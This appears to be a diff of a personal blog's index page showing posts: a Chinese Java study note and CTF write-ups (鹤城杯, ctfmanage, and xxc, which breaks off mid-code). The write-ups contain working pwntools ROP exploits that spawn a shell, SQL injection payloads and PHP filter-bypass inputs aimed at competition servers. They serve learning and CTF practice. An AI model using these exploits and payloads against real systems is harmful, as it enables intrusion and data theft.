@@ -164,6 +164,594 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-Java笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/01/10/Java%E7%AC%94%E8%AE%B0/">Java笔记</a>
+    </h1>
+  
+
+        
+        
+
+
+<a href="/2022/01/10/Java%E7%AC%94%E8%AE%B0/" class="archive-article-date">
+  	<time datetime="2022-01-10T05:31:32.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-10</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>复习：</p>
+<p>Java三大版本<br>JavaSE：标准版（桌面程序，控制台开发……）（入门）<br>JavaME：嵌入式开发（手机，小家电）（几乎没人用了）<br>JavaEE：E级企业级开发（web端，服务器开发）</p>
+<p>JDK：开发<br>JRE：运行环境<br>JVM：java虚拟机<br>JDK包含JRE，JRE包含JVM</p>
+<p>java文件：<br>文件后缀<code>.java</code></p>
+<p>编译命令：<br><code>javac Hello.java</code><br>(生成Hello.class文件)</p>
+<p>运行Hello.class文件：<br><code>java Hello</code></p>
+<p>第一个java程序：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public class Hello&#123;</span><br><span class="line">	public static void main(String[] args)&#123;</span><br><span class="line">		System.out.print(&quot;Hello,world!&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>注意：<br>1.大小写敏感<br>2.尽量用英文<br>3.文件名和类名一致</p>
+<p>语言分类：<br>编译型<br>解释型<br>(区别（我的理解)：编译型就是先编译成可执行文件，然后运行文件（如c），解释型就是根据程序直接运行（如python），解释型更方便但是浪费运算，java两种都可以）</p>
+<p>idea：<br>创建后在src文件夹后写代码<br>打上psvm回车会自动生成</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args)&#123;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<p>sout –&gt; <code>System.out.println();</code></p>
+<p>语法：<br>1.注释：<br><code>//</code> <code>/* */</code><br>有趣的代码注释：<a target="_blank" rel="noopener" href="https://blog.csdn.net/ydk888888/article/details/81563608">https://blog.csdn.net/ydk888888/article/details/81563608</a></p>
+<p>2.标识符：</p>
+<img src="/2022/01/10/Java%E7%AC%94%E8%AE%B0/1.PNG" class="" title="1.PNG">
+<p>（只能字母、美元符、下划线开头，不能作为方法名，大小写敏感）<br>（不能用数字开头，但神奇的是，竟然能用中文开头做变量名！包括类名。感觉可以利用这个特性搞死外国程序员……）</p>
+<p>3.数据类型：<br>（强类型语言）<br>基本数据类型：<br>byte<br>soert<br>int<br>long<br>float<br>double<br>char<br>boolean （true或false，不能用数字，默认false）<br>引用数据类型：<br>类<br>接口<br>数组</p>
+<p>4.类型转换<br>容量：低—————&gt;高<br>byte,short,char-&gt;int-&gt;long-&gt;float-&gt;double</p>
+<p>强制类型转换（高-&gt;低）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int i&#x3D;128;</span><br><span class="line">byte b&#x3D;(byte)i; &#x2F;&#x2F;内存溢出</span><br></pre></td></tr></table></figure>
+<p>自动转换（低-&gt;高）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int i&#x3D;128;</span><br><span class="line">double b&#x3D;i; &#x2F;&#x2F;内存溢出</span><br></pre></td></tr></table></figure>
+<p>注意：<br>1.不能对bool值进行转换<br>2.不能转换成不相干的类型<br>3.可能遇到内存溢出和精度问题</p>
+<p>static 类变量<br>final 常量，不允许改变（只能赋值一次）</p>
+<p>运算符：<br>主要注意位运算符的用法（逻辑）</p>
+<p>Math库运用例：<br>Math.abs(); //绝对值</p>
+<p>包机制：<br>package（放到最上面）<br>路径<br>package后面的是src下面到当前文件所在文件夹的路径<br>语法格式：<br><code>package pkg1[．pkg2[．pkg3…]];</code><br>如</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">package net.java.util;</span><br><span class="line">public class Something&#123;</span><br><span class="line">   ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>的路径为net/java/util/Something.java</p>
+<p>导入包：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">（可以用通配符&#96;&#96;&#96;*&#96;&#96;&#96;来导入某个包中的所有文件）</span><br><span class="line"></span><br><span class="line">认真看阿里巴巴java开发手册！</span><br><span class="line"></span><br><span class="line">javadoc（生成api文档，可以看用了哪些方法）（暂时略过了）</span><br><span class="line"></span><br><span class="line">流程控制：</span><br><span class="line">输入：</span><br></pre></td></tr></table></figure>
+<p>Scanner s=new Scanner(System.in);<br>        if(s.hasNext()){ //判断是否有输入，也可以使用s.hasNextLine()<br>            String str=s.next(); //获取下一串字符串（到空格等截止），也可以使用s.nextLine()，接收一整行<br>            System.out.println(str); //输出字符串<br>        }<br>s.close() //用完关掉，节约空间</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">next():</span><br><span class="line">1.读取到有效字符才会结束输入</span><br><span class="line">2.自动去掉前面的空格</span><br><span class="line">3.到空格和结束符结束</span><br><span class="line">nextLine():</span><br><span class="line">1.以回车为结束符</span><br><span class="line">2.可以获得空白</span><br><span class="line">hasNextInt():</span><br><span class="line">判断后续还有没有整数（也可以判断别的类型）</span><br><span class="line">int f&#x3D;s.nextInt():</span><br><span class="line">接收整数</span><br><span class="line"></span><br><span class="line">if&#x2F;while&#x2F;dowhile&#x2F;for&#x2F;break&#x2F;continue和c++一样</span><br><span class="line">for有个补充：</span><br><span class="line">遍历数组</span><br><span class="line">&#96;&#96;&#96;for(int number:numbers)&#96;&#96;&#96;</span><br><span class="line"></span><br><span class="line">方法：</span><br><span class="line">&#96;&#96;&#96;System.out.ptintln()&#96;&#96;&#96;(类.对象.方法)</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;public static int add(int a,int b)&#123;&#125;&#96;&#96;&#96;</span><br><span class="line"></span><br><span class="line">命令行传参</span><br><span class="line">&#96;&#96;&#96;args.length&#96;&#96;&#96;传入字符串数量</span><br></pre></td></tr></table></figure>
+<p>public static void main(String[] args) {<br>        for(int i=0;i&lt;args.length;i++){<br>            System.out.println(args[i]);<br>        }<br>    }</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">可变参数：</span><br><span class="line">在方法声明中，在指定参数类型后加三个点(...),只能在最后一个参数</span><br><span class="line"></span><br><span class="line">数组：</span><br></pre></td></tr></table></figure>
+<p>dataType[] array; //首选方法,dataType可为int等<br>//或dataType array[]; //效果相同不首选<br>//还需要定义大小（分配空间)<br>dataType[] array = new dataType[arraysize];<br>array.lenth //求数组长度<br>//给数组赋值<br>array[1]=1</p>
+<p>```<br>多维数组<br>int[][] array;</p>
+<p>arrays类：<br>导入：<code>import java.util.Arrays;</code><br>各种数组操作的类<br>如Arrays.tostring() :将数组转换为字符串</p>
+<p>面向对象：<br>（面向对象编程（OOP），面向对象（OO））<br>封装<br>继承<br>多态</p>
+<p>定义方法<br><code>public String hello()&#123;&#125;</code></p>
+<p>继承<br><code>extents</code></p>
+<p><code>super</code>(访问父类的属性)<br><code>this</code>(访问类中的变量，如果什么都不加就是访问方法里的变量)</p>
+<p>instanceof(类型转换)（判断两个类之间是否存在父子关系）</p>
+<p>abstract(抽象类)（只能被继承，不能实例化）</p>
+<p>接口：专业的约束，约束和现实分离：面向接口编程<br>interface （取代class）<br>类实现接口 implements</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/01/10/Java%E7%AC%94%E8%AE%B0/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
+  
+    <article id="post-鹤城杯" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/10/09/%E9%B9%A4%E5%9F%8E%E6%9D%AF/">鹤城杯</a>
+    </h1>
+  
+
+        
+        
+
+
+<a href="/2021/10/09/%E9%B9%A4%E5%9F%8E%E6%9D%AF/" class="archive-article-date">
+  	<time datetime="2021-10-09T03:21:35.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-10-09</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>第一次以团队形式参赛，全大二队伍拿到96名成绩还可以<br>贡献不大，全靠队友带飞</p>
+<p>babyof payload<br>基本的ropgadget<br>from pwn import *<br>from LibcSearcher import *</p>
+<p>#io = process(‘./babyof’)<br>io = remote(‘182.116.62.85’, 21613)<br>elf = ELF(‘./babyof’)<br>context.log_level = ‘debug’</p>
+<p>pop_rdi_ret = 0x400743<br>puts_plt = elf.plt[‘puts’]<br>puts_got = elf.got[‘puts’]<br>func_addr = 0x400632</p>
+<p>payload = b’a’*(0x40 + 8) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(func_addr)<br>io.recv()<br>io.sendline(payload)</p>
+<p>io.recvline()<br>x = io.recv()[0:6]<br>puts_addr = u64(x.ljust(8,b’\x00’))<br>print(hex(puts_addr))</p>
+<p>libc = LibcSearcher(‘puts’,puts_addr)<br>libc_base = puts_addr - libc.dump(‘puts’)<br>system_addr = libc_base + libc.dump(‘system’)<br>binsh_addr = libc_base + libc.dump(‘str_bin_sh’)</p>
+<p>ret = 0x400506<br>payload2 = b’a’*(0x40+8)<br>payload2 += p64(ret) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)</p>
+<p>io.sendline(payload2)<br>io.interactive()</p>
+<p>flag{89b55977-566c-431d-9034-74e7c181f340}</p>
+<p>littleof payload<br>多一个canary读取，和上题基本一样<br>from pwn import *<br>from LibcSearcher import *</p>
+<p>io = remote(‘182.116.62.85’, 27056)<br>#io = process(‘./littleof’)<br>elf = ELF(‘./littleof’)<br>context.log_level = ‘debug’</p>
+<p>pop_rdi_ret = 0x400863<br>puts_plt = elf.plt[‘puts’]<br>puts_got = elf.got[‘puts’]<br>func_addr = 0x4006e2</p>
+<p>payload1 = b’a’ * (0x50 - 8)<br>io.recv()<br>io.sendline(payload1)<br>io.recvuntil(payload1)<br>canary = u64(io.recv(8)) - 0xa<br>print(hex(canary))</p>
+<p>payload2 = payload1 + p64(canary) + p64(1) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(func_addr)<br>io.recv()<br>io.sendline(payload2)</p>
+<p>io.recvline()<br>x = io.recv()[0:6]<br>puts_addr = u64(x.ljust(8,b’\x00’))<br>print(hex(puts_addr))</p>
+<p>libc = LibcSearcher(‘puts’,puts_addr)<br>libc_base = puts_addr - libc.dump(‘puts’)<br>system_addr = libc_base + libc.dump(‘system’)<br>binsh_addr = libc_base + libc.dump(‘str_bin_sh’)</p>
+<p>io.sendline(b’1’)<br>io.recv()</p>
+<p>ret = 0x40059e<br>payload3 = payload1 + p64(canary) + p64(1) + p64(ret) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)</p>
+<p>io.sendline(payload3)<br>io.interactive()</p>
+<p>flag{25e96197d4da10748a055753b5104856}</p>
+<p>easy_crytpo<br>签到题，联想到社会主义核心价值观编码，网上找到在线解码器<br>flag{IlUqU9O5guX6YiITsRNPiQmbhNRjGuTP}</p>
+<p>A_crytpo<br>根据flag长度分析得出可能是四位一组的分组编码，并且前二十位可能是<br>4O59：f<br>5954：l<br>494Q：a<br>3251：g<br>5046：{<br>md，我太菜了！</p>
+<p>WEB MIDDLE_MAGIC<br>level1绕过<br>$aaa = preg_replace(‘/^(.<em>)level(.</em>)$/‘, ‘${1}<!-- filtered -->${2}’, $_GET[‘aaa’]);<br>任意匹配不包括%0a,#需要url编码%23表示<br>aaa=%0apass_the_level_1%23<br>level2<br>sha1绕过，sha1不能对数组加密，返回值都是NULL<br>admin[]=1&amp;root_pwd=2<br>level3<br>json绕过<br>在json中0对应任意字符串<br>level_3 = {“result”:0}<br>flag{f03d41bf6c8d55f12324fd57f7a00427}</p>
+<p>NEW_MISC<br>下载下来是一个pdf文件<br>010打开，发现20/09 16进制对<br>怀疑pdf隐写，wbStego跑一下<br>flag{verY_g00d_YoU_f0und_th1s}</p>
+<p>MISC2<br>下载了一副图片<br>经检查，无隐写，无crc修改<br>放入stegsolve，点点点<br>发现有lsb，将字符串提取出来，发现是NCR转义，将其化为ascii，得<br>flag{h0w_4bouT_enc0de_4nd_pnG}</p>
+<p>easysql2</p>
+<p>xdm可以试试盲注<br>username error 和 passwd error</p>
+<p>数据库名ctf<br>用’and%0a(ascii(substr(version(),1,1))&gt;1)#爆一下版本号<br>版本号为8.0.4<br>使用最新的sql特性注入<br>admin’and/<strong>/(‘def’,’a’,3,4,5,6)&lt;=(table/</strong>/information_schema.TABLE_CONSTRAINTS/<strong>/limit/</strong>/317,1)#</p>
+<p>EASYP<br>题目：<br>&lt;?php<br>include ‘utils.php’;</p>
+<p>if (isset($_POST[‘guess’])) {<br>    $guess = (string) $_POST[‘guess’];<br>    if ($guess === $secret) {<br>        $message = ‘Congratulations! The flag is: ‘ . $flag;<br>    } else {<br>        $message = ‘Wrong. Try Again’;<br>    }<br>}</p>
+<p>if (preg_match(‘/utils.php/*$/i’, $_SERVER[‘PHP_SELF’])) {<br>    exit(“hacker :)”);<br>}</p>
+<p>if (preg_match(‘/show_source/‘, $_SERVER[‘REQUEST_URI’])){<br>    exit(“hacker :)”);<br>}</p>
+<p>if (isset($_GET[‘show_source’])) {<br>    highlight_file(basename($_SERVER[‘PHP_SELF’]));<br>    exit();<br>}else{<br>    show_source(<strong>FILE</strong>);<br>}<br>?&gt;</p>
+<p>脚本：<br>import requests</p>
+<p>for i in range(0,255):</p>
+<pre><code>j=hex(i)[2:]
+print(j)
+url = &#39;http://182.116.62.85:21895/index.php/utils.php/%&#39;+ j + &#39;?show%20source=1&#39;
+#http://182.116.62.85:21895/?show%20source=1
+r = requests.get(url)
+if &#39;flag&#123;&#39; in r.text:
+    print(r.text)
+    break
+</code></pre>
+<p>$_SERVER[‘REQUEST_URI’]会把特殊字符（如空格）转换成下划线<br>$secret需要爆破，所以有了j<br>basename() 函数返回路径中的文件名部分，$_SERVER[‘PHP_SELF’]返回当前执行脚本的文件名。<br>传入<a target="_blank" rel="noopener" href="http://182.116.62.85:21895/index.php/utils.php">http://182.116.62.85:21895/index.php/utils.php</a> 时，$_SERVER[‘PHP_SELF’]会返回index.php/utils.php，而basename()会返回utils.php。这样我们再加上?show%20source=1就可以让highlight_file显示utils.php，而flag就在里面。<br>flag{bsyxmK7ncU5nPjsGMckFo8kgq95qRasg}</p>
+<p>流量分析<br>手工分析<br>首先进行数据包筛选<br>发现是一道sql注入的数据包</p>
+<p>根据数据包回包中字符长度不一样的部分，取出其中的ascii码，转换成flag<br>1 102  f<br>2 108 l<br>3 97<br>4 103<br>5 123<br>6 119<br>7 49<br>8 114<br>9 101<br>10 115<br>11 104<br>12 65<br>13 82<br>14 75<br>15 95<br>16 101<br>17 122<br>18 95<br>19 49<br>20 115<br>21 110<br>22 116<br>23 105<br>24 116<br>25 125<br>26 33<br>flag{w1reshARK_ez_1sntit}</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/10/09/%E9%B9%A4%E5%9F%8E%E6%9D%AF/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
+  
+    <article id="post-ctfmanage" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/10/07/ctfmanage/">ctfmanage</a>
+    </h1>
+  
+
+        
+        
+
+
+<a href="/2021/10/07/ctfmanage/" class="archive-article-date">
+  	<time datetime="2021-10-07T14:29:10.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-10-07</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="ctfmanage"><a href="#ctfmanage" class="headerlink" title="ctfmanage"></a>ctfmanage</h3><p>转载自qq群<code>。</code>大佬发的md文件</p>
+<ul>
+<li>打开题目是一个登录框，加上字母发现直接报错，发现使用的是登录号，所以登录名是一个数字型参数，没有单引号包裹，而密码是一个字符型参数（所以注入点在用户名，密码随便填一个防止因为内容为空脚本验证不通过）：</li>
+</ul>
+<img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202110020318191.png" alt="image-20211002022340742" style="zoom:50%;" />
+
+<ul>
+<li>尝试输入用户名<code>1 or 1=1#</code>，发现被过滤，使用fuzz字典跑一下过滤值：</li>
+</ul>
+<img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202110020318192.png" alt="image-20211002023322880" style="zoom:50%;" />
+
+<ul>
+<li>想到用<code>union</code>联合注入，尝试了很多次但是没有成功，后来发现可以大小写绕过（笑，现在怎么这么多双层防护的题目）</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 Union Select 1,2,3;#</span><br><span class="line">1 Union Select 1,2,database();# &#x3D;&gt; ctf</span><br></pre></td></tr></table></figure>
+
+<img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202110020318193.png" alt="image-20211002031727834" style="zoom:50%;" />
+
+<ul>
+<li>由于or被过滤了，所以这里需要使用无表名注入，且<code>from</code>和<code>where</code>都需要大小写绕过：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1 Union Select 1,2,group_concat(table_name) From sys.schema_table_statistics_with_buffer Where table_schema&#x3D;database();# &#x3D;&gt; 没有输出</span><br><span class="line">1 Union Select 1,2,group_concat(table_name) From mysql.innodb_table_stats Where database_name &#x3D; database();#</span><br><span class="line">&#x3D;&gt; flagisthere,ilikectf</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>接下来就是无列名注入，以下两个payload都失败了：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 Union Select 1,2,&#96;3&#96; From (Select 1,2,3 Union Select * From ilikectf);#</span><br><span class="line">1 Union Select 1,2,b From (Select 1,2,3 As b,4,5 Union Select * From ilikectf)a;#</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>最后使用下面式子成功：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 Union Select * From ilikectf;# &#x3D;&gt; 36476,sgrsgef,gg.php</span><br></pre></td></tr></table></figure>
+
+<img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202110020318194.png" alt="image-20211002031655165" style="zoom:50%;" />
+
+<ul>
+<li>来到<code>gg.php</code>：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(base64_encode(hex2bin(strrev(bin2hex(<span class="variable">$_GET</span>[<span class="string">&#x27;sy&#x27;</span>]))))===<span class="variable">$secret</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ha&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;lo&#x27;</span>]&amp;&amp;md5(<span class="variable">$_POST</span>[<span class="string">&#x27;ha&#x27;</span>])===md5(<span class="variable">$_POST</span>[<span class="string">&#x27;lo&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;ohhhhh so close !!!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>后一个是md5数组绕过。另外一个<code>$secret</code>变量，让我们回想起首页页面源代码中的字符：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 告诉你一个秘密: hjZX1pcnVmdmRzZWZ&#x2F;bGlg&#x3D;&#x3D; --&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>将其反过来解密即可：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo hex2bin(strrev(bin2hex(base64_decode(&#39;hjZX1pcnVmdmRzZWZ&#x2F;bGlg&#x3D;&#x3D;&#39;))));</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ilovectfverymuch</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>所以最后的payload：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">?sy&#x3D;ilovectfverymuch</span><br><span class="line">POST:</span><br><span class="line">ha[]&#x3D;a&amp;lo[]&#x3D;b</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>获得flag：</li>
+</ul>
+<img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202110020318195.png" alt="image-20211002031342627" style="zoom:50%;" />
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;23c2e3e4-d2f8-4770-9c7d-84142263a47a&#125;</span><br></pre></td></tr></table></figure>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/10/07/ctfmanage/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
+  
+    <article id="post-xxc" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/10/05/xxc/">xxc</a>
+    </h1>
+  
+
+        
+        
+
+
+<a href="/2021/10/05/xxc/" class="archive-article-date">
+  	<time datetime="2021-10-05T06:05:39.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-10-05</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>转载自qq群<code>.</code>师傅发布的md文件</p>
+<p>原题地址：<a target="_blank" rel="noopener" href="https://buuoj.cn/match/matches/36/challenges">https://buuoj.cn/match/matches/36/challenges</a></p>
+<h3 id="xxc"><a href="#xxc" class="headerlink" title="xxc"></a>xxc</h3><ul>
+<li>打开网页提示<code>一条链子</code>，使用dirmap扫描到网站源码<a target="_blank" rel="noopener" href="http://www.zip,进行代码审计./">www.zip，进行代码审计。</a></li>
+<li>index.php其中存在反序列化操作，这道题确定是一道序列化的题目：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;closure/autoload.php&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_loader</span>(<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">require_once</span> <span class="string">&#x27;./class/&#x27;</span> . (str_replace(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="variable">$class</span>) . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">spl_autoload_register(<span 